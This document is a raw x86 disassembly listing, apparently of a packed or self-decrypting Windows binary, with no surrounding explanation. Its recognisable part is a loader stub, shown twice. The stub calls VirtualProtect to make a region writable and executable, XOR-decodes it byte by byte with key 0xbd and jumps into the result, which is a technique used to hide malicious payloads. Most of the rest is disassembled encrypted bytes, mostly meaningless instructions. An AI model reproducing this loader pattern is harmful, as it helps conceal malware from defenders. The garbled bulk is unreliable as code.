imul esi [ esp + esi * 2 + 0x65 ] 0x3243172
add [ eax ] al
or eax [ eax ]
push es
add [ eax ] al
adc al 0x0
xor [ eax + 0x3 ] ecx
je r-xdata
je r-xdata
jo r-xdata
nop
nop
push r-xdata
call sub_488470
nop
lea eax [ ebp - 0x8 ]
push eax
push 0x40
push 0x5e79
push ebx
call VirtualProtect
nop
nop
xor eax eax
test [ edx ] r-xdata
test [ edi - 0x9dbffbd ] dl
inc edx
add [ eax + 0x50004855 ] bl
outsd
add al 0x1d
inc ebx
add [ eax ] dl
test [ ebp ] 0xd8
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
xor [ ebx + eax ] ecx
add [ 0x63410d00 ] dl
arpl [ ebp + 0x73 ] sp
jae r-xdata
jb r-xdata
push esp
inc esi
outsd
jb r-xdata
inc esi
outsd
jb r-xdata
insd
push eax
imul esp [ ebx + 0x74 ] 0x44657275
outsb
outsb
inc edi
jb r-xdata
insb
outsd
outsb
xor [ eax ] esi
add eax [ eax ]
add [ esi ] cl
add [ esi ] al
dec ecx
insd
popad
xor [ gs : si ] esi
add eax [ eax ]
add [ edi ] cl
add [ edx ] cl
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
outsd
add eax [ eax ]
add [ eax + eax ] dl
dec eax
outsd
push ebx
push 0x31657061
sub [ ebx ] al
add [ eax ] al
or al 0x0
or edx [ ebx + 0x74 ]
jb r-xdata
outsb
jne r-xdata
nop
lea edx [ eax + ebx ]
mov dl [ edx ]
xor dl 0xbd
lea ecx [ eax + ebx ]
mov [ ecx ] dl
nop
inc eax
cmp eax 0x5e7a
jne r-xdata
nop
nop
add ebx 0xed2
mov [ ebp - 0x4 ] ebx
nop
nop
jmp [ ebp - 0x4 ]
add [ edi ] eax
test al 0x71
inc ebx
add [ ebx - 0x9efffbd ] al
inc ebp
add al bl
jo r-xdata
push es
mov [ eax + ecx * 2 ] fs
lea eax [ eax ]
push esp
test [ eax ] cl
xor [ eax + 0x3 ] edx
add [ eax ] al
push ss
add [ ebx ] cl
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
pop es
xor [ esi ] eax
push esp
inc esi
outsd
jb r-xdata
je r-xdata
add [ eax ] al
or eax 0x70530c00
inc edx
jne r-xdata
xor [ fs : ebx + eax ] ebp
adc al 0x3
xor [ edi ] edx
add [ ebp + esi * 4 + 0x43 ] cl
add [ ebx + ebx * 2 + 0x45 ] ch
inc ebp
add [ eax ] cl
mov esi 0xc6a40043
inc ebx
add [ edi + edi * 2 + 0x39880047 ] bl
inc ebx
add [ eax - 0x77ffbce8 ] dh
inc ebx
add [ eax ] cl
rol [ ebx ] cl
push eax
xchg ebp eax
jb r-xdata
insb
pop ebx
inc ebp
imul esp [ ecx + 0x6c ] 0x4431676f
add eax [ eax ]
add [ ebx ] dl
add [ ebx ] cl
push ebx
popad
jbe r-xdata
inc esp
sub_488470
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx [ ebp + 0x8 ]
nop
test ebx ebx
je r-xdata
nop
nop
push r-xdata
call sub_488470
xor [ eax ] dh
inc ebp
inc eax
inc edx
inc edx
push esp
pushad
xchg edx eax
mov ebp 0x2d2d2dbd
cmp [ edx - 0x4e ] al
cmp bl bh
jmp 0xfffffffffe79429d
nop
lea eax [ ebp - 0x8 ]
push eax
push 0x40
push 0x5e79
push ebx
call VirtualProtect
nop
nop
xor eax eax
nop
lea edx [ eax + ebx ]
mov dl [ edx ]
xor dl 0xbd
lea ecx [ eax + ebx ]
mov [ ecx ] dl
nop
inc eax
cmp eax 0x5e7a
jne r-xdata
nop
nop
add ebx 0xed2
mov [ ebp - 0x4 ] ebx
nop
nop
jmp [ ebp - 0x4 ]
sub_488935
push esp
sub dh dh
mov ebp 0x547438bd
nop
mov al 0xbd
mov ebp 0xe52d2d2d
xlat
cwde
push esp
pop esp
xchg edx eax
mov ebp 0x2d2d2dbd
sub eax 0xb90bb22d
mov bl 0x54
jge r-xdata
movsd [ edi ] [ esi ]
mov ebp 0x2d2d2dbd
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xee8138b2
mov ebp 0x547d8ebd
in al dx
cmpsd [ esi ] [ edi ]
mov ebp 0x2d2d2dbd
sub eax 0x55b5eb42
mov edi 0x4536bdbd
jpo r-xdata
mov ebp 0x4039b2bd
movsd [ edi ] [ esi ]
mov ebp 0xd5b9d7bd
mov ebp 0x54bdbd8d
pop edi
lahf
mov ebp 0xeeea2dbd
mov ecx 0x2d2dbdbd
sub eax 0x85bc39b2
mov ebp 0xec6254bd
mov ebp 0x362d2dbd
dec ebp
cmp [ ebx - 0x4e ] cl
cmp eax ecx
nop
mov ebp 0x4650d5bd
mov cl 0xbc
mov ebp 0x5136e8bd
push ecx
loope r-xdata
inc edx
jmp r-xdata
fisubr [ ebx ]
push esp
mov ebx 0x2dbdbdab
sub eax 0x2d2d2d2d
sub eax 0x362d2d2d
dec edi
xchg esi eax
jb r-xdata
sub eax 0x384d362d
dec ebx
mov dl 0x39
enter 0xbd90 0xbd
aad 0x50
inc esi
xchg [ esi - 0x4e ] cl
cmp [ edx + ecx * 4 - 0x43 ] bh
mov ebp 0xae546a36
sahf
mov ebp 0x3c552dbd
xchg [ ebp - 0x43a92a43 ] edi
hlt
mov ebp 0x364536bd
jpo r-xdata
sub_488972
push esp
lodsb [ esi ]
pushfd
mov ebp 0x547d38bd
inc ebp
mov ecx 0x2d2dbdbd
sub eax 0x85bc39b2
mov ebp 0xec6254bd
mov ebp 0x362d2dbd
dec ebp
cmp [ ebx - 0x4e ] cl
cmp eax ecx
nop
mov ebp 0x4650d5bd
fisubr [ ebx ]
push esp
mov ebx 0x2dbdbdab
sub eax 0x2d2d2d2d
sub eax 0x362d2d2d
dec edi
xchg esi eax
jb r-xdata
sub eax 0x384d362d
dec ebx
mov dl 0x39
enter 0xbd90 0xbd
aad 0x50
inc esi
xchg [ esi - 0x4e ] cl
cmp [ edx + ecx * 4 - 0x43 ] bh
mov ebp 0xae546a36
sahf
mov ebp 0x3c552dbd
xchg [ ebp - 0x43a92a43 ] edi
hlt
sub_48947d
push ebp
push ss
mov esi 0x7d38bdbd
mov dl 0x39
lahf
mov ebp 0x860c54bd
mov ebp 0x2d2d2dbd
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xf834db2d
pop ebp
push esp
mov [ 0x2dbdbdf4 ] al
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x7ee3e22d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x8ed9eb42
je r-xdata
jle r-xdata
inc ebp
inc edx
mov dl 0x28
jl r-xdata
adc cl [ ecx + 0x34ea2eed ]
sti
lea edx [ ebp + 0x48 ]
xchg ebx eax
mov ebp 0x459054bd
inc edx
inc edx
sub eax 0xb245f884
xor esi eax
0x5581fb34 0x929f
les edx [ ebx + 0x34ea297e ]
sti
adc [ ebp - 0x61 ] 0xd5bdbd92
or al 0xb5
mov ecx 0xfb34ea4a
std
push ebp
test eax 0xd5bdbd92
fmul [ esi - 0x16 ]
dec edx
0x55f9fb34 0x92bb
inc esp
inc edx
mov esp 0xbdb7bc54
mov ebp 0xf654b9d7
cwde
mov ebp 0x2d2d2dbd
sub eax 0x2d2d2d2d
sub eax 0xd52d2d2d
pop ds
sbb ebx esp
push esi
0xbd928355 0xd5bd
sub_48950a
push 0xea9fd9f2
xor al 0xfb
test [ ebp - 0x73 ] edx
xchg edx eax
mov ebp 0x93c4d5bd
jle r-xdata
adc cl [ ecx + 0x34ea2eed ]
sti
lea edx [ ebp + 0x48 ]
xchg ebx eax
mov ebp 0x459054bd
inc edx
inc edx
sub eax 0xb245f884
xor esi eax
0x5581fb34 0x929f
sub_4895b0
sub eax 0x7654e6e2
int1
mov ebp 0x2d2d2dbd
sub eax 0xf834db2d
arpl bp sp
xlat
rcl [ esi - 0x69 ] cl
mov ebp 0xb5eb42bd
mov es [ edx - 0x6 ]
test dh al
xchg ebp eax
mov dl 0x38
inc ebp
mov edi 0x4355bdbd
mov bh 0xbd
mov ebp 0x38b27d38
mov al 0xbd
mov ebp 0x925755bd
mov ch 0xbd
mov ebp 0xeeed2d2d
inc edx
jmp r-xdata
mov ebp 0x478854bd
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x5451362d
mov esi 0x34bdbdbc
rol [ ecx + 0x42 ] 0xeb
shr edx 0x1
shr [ ebp - 0x12be07d0 ] 0xea
inc edx
enter 0xeeb1 0x42
jmp r-xdata
mov ebp 0xb27d38bd
cmp esi esi
pushfd
mov ebp 0x9c9354bd
mov ebp 0x2d2d2dbd
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xedcb422d
xor al 0xe0
inc edx
enter 0x4241 0xc8
pop ecx
inc edx
insd
xlat
mov ecx 0xbd8dbdd5
mov ebp 0x54edcb42
adc [ edx - 0x7cb4243 ] ch
inc ecx
push esp
mov edx 0x2dbdbdb5
sub eax 0xeb42eeed
test eax 0x40690034
inc edx
mov ebp 0xb27d38bd
cmp [ eax + 0x55bdbdbd ] dh
push edi
xchg edx eax
inc edx
push esp
xchg ebx eax
xchg edi eax
mov ebp 0xb24238bd
cmp [ 0x54bdbdb5 ] esi
sbb al 0x43
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
push ebp
push ebx
nop
mov ebp 0x54e4e4bd
xchg ebp eax
mov [ 0xffffffffbe2dbdbd ] al
clc
lodsd [ esi ]
push esp
mov edx 0x2dbdbd92
sub eax 0x542d2d2d
fsubr [ ecx + 0x2d2dbdbd ]
sub eax 0x42552d2d
stosd [ edi ]
mov ebp 0x61e830bd
push ebp
jpo r-xdata
sub_48977c
dec ecx
xlat
fsub st5
xlat
rcr ebx 0x1
xor al 0xf8
dec ebx
in eax 0xd7
fist [ eax + ecx * 2 - 0x6a ]
mov ebp 0x2d2d2dbd
push ecx
push esp
jo r-xdata
cmp [ eax ] edx
inc edx
inc edx
inc edx
out dx al
inc edx
sub edx [ ecx ]
mov ebp 0x42d5bdbd
mov ebp 0x54eebdbd
xor eax [ edx + 0x42 ]
inc edx
sub eax 0xa5793e2d
push esp
sbb al 0x4f
inc edx
inc edx
sub eax 0x69f834db
mov ebp 0x2d2d2dbd
cmp al 0x51
fnstenv [ edi - 0x14114243 ]
0x668e4536 0x4686
sub_489962
mov ebp 0xd52d2dbd
pop esp
mov edi 0x34ea0c7a
sti
lds edx [ ebp + 0x6e ]
xchg edi eax
mov ebp 0x8a85d5bd
or [ ecx - 0x16 ] 0x34
cmp edi [ ecx ]
mov ebp 0x7f55bdbd
xchg edi eax
mov ebp 0x7170d5bd
leave
jpo r-xdata
test [ edx + 0x34ea4983 ] ecx
xor al 0x3b
xor eax 0x55bdbdbd
or al 0x97
mov ebp 0x4085d5bd
xchg edi eax
das
0xbd2d3b34 0xbdbd
sub_4899a2
push ebp
sbb eax 0xd5bdbd97
pop edx
mov edx 0x34ea483d
cmp ebp [ ecx ]
mov ebp 0x3255bdbd
xchg edi eax
mov ebp 0x69a6d5bd
in eax dx
fucomip st2
xor al 0x3b
sbb [ ebp + 0x6b54bdbd ] edi
inc esi
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x138302d
inc edi
inc edx
inc edx
mov dl 0x39
iretd
sub_4899de
xchg [ ebp + 0x61e830bd ] edi
push ebp
fild [ eax - 0x44ab4243 ]
mov ebx 0x2d2dbdbd
sub eax 0x2d2d2d2d
in eax 0xdb
xor al 0xf8
dec ebx
push esp
lodsd [ esi ]
mov esi 0x2d2dbdbd
sub eax 0x2d7e74e6
sub eax 0x2d2d2d2d
sub eax 0xbd3dbdd5
mov ebp 0xc942bdd7
cdq
xchg ebp eax
inc edx
jmp r-xdata
popad
sub_489a6d
out 0x54 eax
je r-xdata
mov ebx 0x2d2dbdbd
sub eax 0x74b5f836
jle r-xdata
mov ebp 0x342d2dbd
cmp eax [ ecx - 0x43 ]
mov ebp 0x947a55bd
mov ebp 0x8f50d5bd
mov ebx 0x4f54ee53
inc eax
inc edx
inc edx
jmp r-xdata
call 0xffffffffc07d75ef
push edi
loop r-xdata
sub eax 0x2d2d2d2d
sub eax 0x7d8e2d2d
std
loop r-xdata
xlat
mov ebp 0x4d366e42
je r-xdata
shl edi 0x1
cmp [ ebx - 0x4e ] cl
mov ebx 0xeebdbfbd
push esp
dec esi
jle r-xdata
cmp [ edi - 0x44 ] eax
mov ebp 0x6601d5bd
push ss
add [ ebx + edx * 2 - 0x51 ] dl
mov ebp 0x2d2d2dbd
sub eax 0xdbd4d72d
xor al 0xf0
push ecx
in al 0xd7
rcr ebx cl
xor al 0xf0
push ebx
in al 0xdb
xor al 0xf0
dec ebp
jne r-xdata
xchg ebx eax
dec ebp
mov ecx 0xbd8dbdd5
mov ebp 0xbdbcbdd5
mov ebp 0x6e42bdd7
sub eax 0x2d2d2d2d
sub eax 0xdbded72d
xor al 0xe0
arpl [ esi ] si
xor al 0xe8
sub eax 0x2d2d2d2d
sub eax 0x34dbded7
loopne r-xdata
mov bh 0xbd
mov ebp 0xbdd5b9d7
lea edi [ ebp - 0x43422a43 ]
mov ebp 0x42bdd7bd
outsb
mov ebp 0xbdbbd5bd
mov edi 0x4e54eebd
sub_489b1f
xchg edx eax
mov ebp 0xa6654abd
jge r-xdata
clc
inc ecx
dec edx
je r-xdata
std
mov ah 0xbd
mov ebp 0x38b24e86
bound edx [ edi + 0x42 ]
sub eax 0x2d2d2d2d
sub eax 0x54bc86db
clc
mov dh 0xbd
mov ebp 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x7a2d2d2d
clc
dec eax
xlat
mov ebp 0x7254bdd7
inc eax
inc edx
inc edx
sub eax 0x2d2d2d2d
aad 0x5f
xor ah ah
in eax 0xea
xor al 0x3b
and eax 0x55bdbdbd
bound edx [ ebp - 0x652a4243 ]
cld
aad 0xe6
0xbd213b34 0xbdbd
inc edx
out dx al
inc edx
test al 0x11
mov ebp 0xd654bdbd
cmp [ ebp + 0x2d2d2dbd ] 0xea
push esp
jle r-xdata
and [ ebp + 0x7355bdbd ] edi
xchg ebp eax
mov ebp 0x1d3b34bd
mov ebp 0x793ebdbd
lea edx [ edi + edi * 4 - 0x49 ]
mov ebp 0xf8362dbd
mov ch 0x55
mov ecx 0xe4bdbd92
cmp [ ebp - 0x4e ] bh
cmp bh ch
movsb [ edi ] [ esi ]
mov ebp 0x2d7e74bd
sub eax 0x6f8e2d2d
push esp
add [ edx + eax * 2 + 0x42 ] edx
sub eax 0xb4fd54e8
mov ebp 0xb24e86bd
cmp [ edx + 0x57 ] ah
inc edx
mov ebp 0x2b42eebd
pop ebp
mov ebp 0xe836bdbd
mov ch 0x30
cmp [ ebp + 0x40 ] dh
inc edx
inc edx
push esp
xchg esp eax
mov al 0xbd
mov ebp 0x2d2d2d2d
sub_489c33
std
mov ebp 0xbd9ade54
mov ebp 0x47f834db
aad 0xb9
mov esp 0x3830bdbd
cmp [ esi + 0x42 ] eax
inc edx
in eax dx
clc
mov ch 0x42
in eax dx
cdq
cmp [ ebp + 0x54 ] bh
mov esi 0x2dbdbd98
sub eax 0x513e2d2d
fucomp st6
jmp r-xdata
clc
sub_489cb8
mov ebp 0xdbed2d2d
xor al 0xf0
adc eax 0xa4ec54eb
mov ebp 0x2d2d2dbd
sub eax 0x547d8e2d
salc
lahf
mov ebp 0x6138b2bd
mov cl 0xbd
mov ebp 0xb999f996
push esp
cld
lahf
mov ebp 0x486055bd
inc edx
inc edx
r-xdata
aad 0xcc
jmp r-xdata
push esp
jge r-xdata
sub eax 0xc8422d2d
pop ecx
xor al 0xe0
popad
inc edx
0xf54eaa5 0xbdb2
sub eax 0x2d2d2d2d
sub eax 0xf834db2d
pop edi
in eax 0xd7
hlt
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x39302d2d
cdq
sub eax 0xedbdbdbd
aad 0xb9
mov esp 0x9654bdbd
mov [ ebp + 0x542d2dbd ] bh
insd
lodsd [ esi ]
mov ebp 0x2d2d2dbd
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
push ebp
test [ ebx + 0xc54bdbd ] esi
dec ebp
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x5ff834db
sub_48a9c2
xor al 0xc0
jns r-xdata
jge r-xdata
jmp r-xdata
push ecx
push esp
fistp [ ebp + edi * 4 - 0x24d2d243 ]
xor al 0xf0
in al 0xd7
fcmovu st3
xor al 0xf0
in al 0xd7
xchg ebx eax
xor al 0xa
inc edi
inc edx
inc edx
r-xdata
sub eax 0x55f834db
cmp [ ebp - 0x4e ] bh
cmp [ ebx + 0x48 ] esp
inc edx
inc edx
xor [ eax ] bh
jne r-xdata
jle r-xdata
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x36e82d2d
push ecx
cmp al 0x51
xchg ecx eax
mov edi 0x87d7bdbd
in eax 0xd7
out 0x54 eax
fldenv [ ebx + 0x42 ]
inc edx
in eax 0xd7
rcr ebx cl
xor al 0xf8
push edi
in eax 0xd7
leave
inc edx
inc edx
in eax dx
push esp
scasd [ edi ]
dec ecx
inc edx
inc edx
sub eax 0xf834db2d
push ebp
sub eax 0x2d2d2d2d
sub eax 0x45093830
sub eax 0x2d2d2d2d
sub eax 0x99f9362d
mov ecx 0xb754b537
test al 0xbd
mov ebp 0x7fc034db
inc ebx
inc edx
inc edx
in eax dx
mov fs [ esi - 0x12 ]
inc edx
jmp r-xdata
sub eax 0x938302d
inc ebp
sub_48a9c8
inc ebp
push esp
mov ebx 0x2d42425b
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x38302d2d
or [ ebp + 0x42 ] eax
inc edx
in eax dx
mov fs [ esi - 0x12 ]
inc edx
jmp r-xdata
sub eax 0x938302d
inc ebp
inc edx
sub_48ab53
in eax dx
xor al 0xf8
dec ecx
out dx al
in eax dx
push esp
cmp eax 0x54424267
xchg esi eax
inc ebp
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xdb2d2d2d
xor al 0xf8
inc ebp
xor al bh
cmp [ eax + ecx * 8 - 0x4a ] edx
mov ebp 0x2d2d2dbd
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xce54e52d
pushfd
mov ebp 0x552d2dbd
sub eax 0xd5bdbda5
mov eax [ 0xffffffffea34016f ]
xor al 0xfb
fst [ ebp + 0x3f ]
movsd [ edi ] [ esi ]
mov ebp 0xecc1d5bd
fcmovbe st7
0x54d9fb34 0x6053
sub_48acf6
mov al [ 0x2d2dbdbd ]
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
xor al 0xc0
push ecx
push esp
xor al 0xb7
mov ebp 0xab22dbd
sti
mov ebx 0x4255ab54
inc edx
sub eax 0x41f0362d
r-xdata
dec esp
inc edx
outsb
jpo r-xdata
sub eax 0x28b22d2d
jl r-xdata
xor al 0xf0
inc ecx
push esp
shl [ ebp + edi * 4 + 0x2d2d2dbd ] 0x1
sub eax 0x2d2d2d2d
sub eax 0x42440054
inc edx
sub eax 0x2d2d2d2d
sub eax 0xe37d8e2d
out 0x74 al
jle r-xdata
sub eax 0x2d2d2d2d
sub eax 0x4400542d
inc edx
inc esi
mov ah 0xbd
mov ebp 0x2d2d2d2d
sub eax 0x42edcb42

aad 0xbd
mov ebp 0xc8423dbd
mov ch 0x54
mov al 0x88
mov ebp 0xc954eabd
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x342d2d2d
clc
inc ecx
in eax dx
push esp
sub eax 0x41d83e2d
mov ebp 0x42540c54
inc edx
sub eax 0xf834db2d
outsd
mov fs [ esi + 0x54 ]
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xf9d7eb2d
mov fs [ esi + 0x30 ]
clc
xor eax 0xd055edee
mov dl 0xbd
mov ebp 0xd7b1793e
lodsd [ esi ]
push esp
mov ebx 0x2d42424a
scasb [ edi ]
mov ebp 0xadc03dbd
mov esp 0x5fa338b2
inc edx
inc edx
out dx al
xor [ eax ] bh
jne r-xdata
inc edx
inc edx
inc edx
in eax dx
xor [ eax ] bh
or [ ebp + 0x42 ] eax
inc edx
in eax dx
inc edx
jmp r-xdata
lea edi [ ebp + 0x42ee2dbd ]
sub bh [ 0x54bdbdbd ]
enter 0x4240 0x42
sub eax 0x2d2d2d2d
sub eax 0x7d8e2d2d
xlat
stc
push esp
inc eax
inc edx
inc edx
xor [ ecx ] bh
cdq
and eax 0xeabdbdbd
in eax dx
jpo r-xdata
mov ebp 0x2d2d2dbd
sub eax 0x2d2d2d2d
sub eax 0xd52d2d2d
mov ebp 0x423dbdbd
enter 0x54b5 0xb0
mov [ ebp - 0x36ab1543 ] bh
sub_48adad
xchg ebp eax
sub eax 0x41d83e2d
mov ebp 0x42540c54
inc edx
sub eax 0xf834db2d
outsd
mov fs [ esi + 0x54 ]
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xf9d7eb2d
mov fs [ esi + 0x30 ]
clc
xor eax 0xd055edee
mov dl 0xbd
mov ebp 0xd7b1793e
lodsd [ esi ]
push esp
mov ebx 0x2d42424a
scasb [ edi ]
mov ebp 0xadc03dbd
mov esp 0x5fa338b2
inc edx
inc edx
out dx al
xor [ eax ] bh
jne r-xdata
inc edx
inc edx
inc edx
in eax dx
xor [ eax ] bh
or [ ebp + 0x42 ] eax
inc edx
in eax dx
inc edx
jmp r-xdata
mov ebp 0x2d2d2dbd
sub eax 0x2d2d2d2d
sub eax 0xd52d2d2d
mov ebp 0x423dbdbd
enter 0x54b5 0xb0
mov [ ebp - 0x36ab1543 ] bh
lea edi [ ebp + 0x42ee2dbd ]
sub bh [ 0x54bdbdbd ]
enter 0x4240 0x42
sub eax 0x2d2d2d2d
sub eax 0x7d8e2d2d
xlat
stc
push esp
inc eax
inc edx
inc edx
xor [ ecx ] bh
cdq
and eax 0xeabdbdbd
in eax dx
jpo r-xdata
sub_48b158
mov dl 0x38
sbb eax 0x36bdbdb6
cmc
mov ch 0x54
add al 0xb5
mov ebp 0x2d2d2dbd
sub eax 0x5f39b22d
dec ebp
inc edx
inc edx
push esp
out 0xb0 eax
mov ebp 0x2d2d2dbd
sub eax 0xf8362d2d
inc ebp
push esp
in al 0x46
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x342d2d2d
sti
lodsd [ esi ]
push ebp
imul edi [ ebp - 0x286c143 ]
aad 0x43
fstp st6
push eax
0x55a9fb34 0xaf1c
sub_48b21c
push esp
inc ebp
mov ebx 0x2d2dbdbd
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
cmp [ ebp - 0x4e ] bh
cmp [ eax + 0x30bdbd9f ] dh
clc
sub ebp ebp
jmp r-xdata
sub eax 0xe22d2d2d
xlat
sub_48b245
xor [ ecx ] dh
inc eax
inc edx
inc edx
push ebp
xchg edi eax
dec eax
inc edx
inc edx
push esp
push ebx
pushfd
mov ebp 0x2d2d2dbd
sub eax 0x2d2d2d2d
inc edx
0xb27d38f1 0x7f39
sub_48b27c
out 0x54 eax
dec ecx
cmpsb [ esi ] [ edi ]
mov ebp 0x2d2d2dbd
sub eax 0x362d2d2d
bound edx [ ebp + ecx - 0x4b ]
mov ebp 0x2d2d2dbd
sub eax 0x2d2d2d2d
sub eax 0x7c362d2d
mov dl 0x39
cmpsb [ esi ] [ edi ]
xchg ebp eax
mov ebp 0xbf7d3ebd
push esp
mov ah 0x95
mov ebp 0x45e034bd
fild [ esi + 0x5c54bbfb ]
inc eax
inc edx
inc edx
sub eax 0x2d2d2d2d
cmp [ ebp + 0x40 ] ah
inc edx
inc edx
xchg al bh
mov ch 0xb2
cmp [ edi ] ebp
scasd [ edi ]
mov ebp 0x6d3830bd
inc eax
inc edx
inc edx
in eax dx
out dx al
inc edx
0xa46b54a9 0xbdbd
sub_48b348
xor al 0xe8
pop ebp
insb
push esp
fcom [ eax + 0x2d2dbdbd ]
inc edx
enter 0x30b5 0x38
push ebp
inc ecx
inc edx
inc edx
inc edx
enter 0xeda9 0x42
sub dl [ ecx - 0x43 ]
mov ebp 0xb1793ebd
xor [ eax ] bh
push ecx
inc eax
inc edx
inc edx
in eax dx
inc edx
0x55383091 0x4241
sub_48b379
inc edx
in eax dx
push esp
les ebp [ edx + 0x42 ]
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xbdb72654
mov ebp 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xfb34ea2d
rcl [ ebp + 0x32 ] 0x1
lodsd [ esi ]
mov ebp 0x5828d5bd
adc al 0x2a
0x54cdfb34 0x6c7f
sub_48b3c4
inc edx
inc edx
sub eax 0xbd412a42
mov ebp 0x428b42bd
sub cl [ ecx - 0x43 ]
mov ebp 0x2d2d7ebd
sub eax 0x2d2d2d2d
sub eax 0x1a39b22d
mov ecx 0xf030bdbd
add eax 0x5515f830
cmpsb [ esi ] [ edi ]
nop
mov ebp 0x667e54bd
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0xb22d2d2d
cmp dh dl
cmpsb [ esi ] [ edi ]
mov ebp 0xa1c23ebd
mov esp 0xbdee38b2
mov ebp 0x993930bd
sub eax 0xedbdbdbd
aad 0xb9
mov esp 0x2b42bdbd
add eax 0x38bdbdbd
jge r-xdata
sub eax 0x2d2d2d2d
sub eax 0xb22d2d2d
cmp [ edx ] ebx
cmp [ ebp + 0x30bdbdbd ] eax
0x993930bb 0xbd2d
sub_48b43c
inc ebp
inc edx
mov dl 0x38
xchg edi eax
cmpsb [ esi ] [ edi ]
mov ebp 0x30bcd7bd
stc
cdq
xchg edx eax
in eax dx
xor [ ecx ] bh
cdq
and eax 0xedbdbdbd
jpo r-xdata
cdq
mov cl [ ebp + 0x424d5a55 ]
inc edx
r-xdata
mov ebp 0xd5edbdbd
mov ecx 0x42bdbdbc
sub eax [ 0x38bdbdbd ]
fstp [ ecx - 0x7aab425b ]
nop
mov ebp 0x793e2dbd
mov cl 0xd5
mov ch 0xbf
mov ebp 0xc53830bd
inc eax
inc edx
inc edx
out dx al
in eax dx
push esp
inc ebp
insb
inc edx
inc edx
sub eax 0xbdb57955
mov ebp 0x4e864d36
push esp
stc
inc edx
inc edx
0x39b27438 0x5ac4
jge r-xdata
sub eax 0x2d2d2d2d
sub eax 0xb22d2d2d
cmp [ edx ] ebx
mov ecx 0xf030bdbd
add eax 0x5515f830
cmpsb [ esi ] [ edi ]
nop
mov ebp 0x667e54bd
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0xb22d2d2d
cmp dh dl
cmpsb [ esi ] [ edi ]
mov ebp 0xa1c23ebd
mov esp 0xbdee38b2
mov ebp 0x993930bd
sub eax 0xedbdbdbd
aad 0xb9
mov esp 0x2b42bdbd
add eax 0x38bdbdbd
cmp [ ebp + 0x30bdbdbd ] eax
0x993930bb 0xbd2d
sub_48b92e
xor al 0xf8
pop ebp
push esp
cdq
mov al [ 0x2d2dbdbd ]
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x677854eb
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x42e9cb42
enter 0x42b5 0xc8
inc ecx
inc edx
enter 0x4259 0xea
mov eax [ 0x55c842ee ]
push esp
cld
movsd [ edi ] [ esi ]
mov ebp 0x2d2d2dbd
jpe r-xdata
jne r-xdata
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
inc edx

iretd
sub_48ba8f
xlat
popfd
jmp r-xdata
cwde
jl r-xdata
sub eax 0xede034db
xlat
iretd
push ecx
dec esi
inc edx
inc edx
sub eax 0x6a483ab2
inc edx
inc edx
sti
push esp
das
inc ecx
inc edx
inc edx
sub eax 0xdde834db
out 0xd7 eax
fstp st3
xor al 0xe8
sub_48ba93
arpl [ ecx + 0x2d2dbdbd ] bx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x65e834db
insb
push esp
cld
push esi
inc edx
inc edx
sub eax 0x9999d93e
mov ebp 0x9999f930
in eax dx
mov dl 0xa
mov edx 0xfa36dbed
mov edi 0x99f9bedb
mov eax [ 0xffffffffed7d0ab2 ]
jpo r-xdata
test eax 0xd5c834db
enter 0xedc1 0x36
jpo r-xdata
xchg esp eax
inc esi
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xe49fd72d
xlat
cwde
jl r-xdata
xor al 0xe8
xlat
sub eax 0xede034db
xlat
iretd
push ecx
dec esi
inc edx
inc edx
sub eax 0x6a483ab2
